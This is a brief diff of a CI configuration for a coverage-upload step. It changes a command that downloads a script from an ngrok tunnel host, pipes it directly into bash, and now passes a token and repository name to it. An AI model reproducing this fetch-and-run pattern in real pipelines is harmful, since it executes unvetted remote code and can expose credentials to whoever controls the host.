@@ -33,7 +33,7 @@ jobs:
           file: coverage/*.xml
       - run:
           name: Upload coverage - Drazisil - testing
-          command: bash <(curl -s http://joe-ccetest-1543d3.ngrok.io/bash)
+          command: bash <(curl -s http://joe-ccetest-1543d3.ngrok.io/bash) -t "ghe-123abc" -r drazisil/mco-server
       - upload-artifacts-group
       - store_test_results:
           path: test-reports
